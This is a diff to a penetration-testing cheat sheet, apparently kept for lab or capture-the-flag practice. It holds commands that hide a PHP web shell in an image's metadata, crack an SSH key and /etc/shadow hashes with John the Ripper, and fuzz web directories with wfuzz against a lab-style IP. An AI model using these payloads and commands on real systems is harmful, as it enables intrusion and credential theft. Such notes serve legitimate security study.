@@ -51,6 +51,23 @@ exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
 exiftool “-comment<=back.php” back.png
 ~~~
 
+Cracking SSH
+~~~
+ssh2john id_rsa > id_rsa.hash
+john --wordlist=wordlist.txt id_rsa.hash
+~~~
+
+Cracking /etc/shadow
+~~~
+unshadow passwd.hashes shadow.hashes > unshadowed_passwords.txt
+john --wordlist=wordlist.txt passwords.txt
+~~~
+
+WFUZZ
+~~~
+wfuzz  -w /usr/share/wordlists/dirb/common.txt --hc 404,500 -u http://10.10.10.168:8080/
+~~~
+
 **Windows**
 
 Metasploit windows meterpreter session
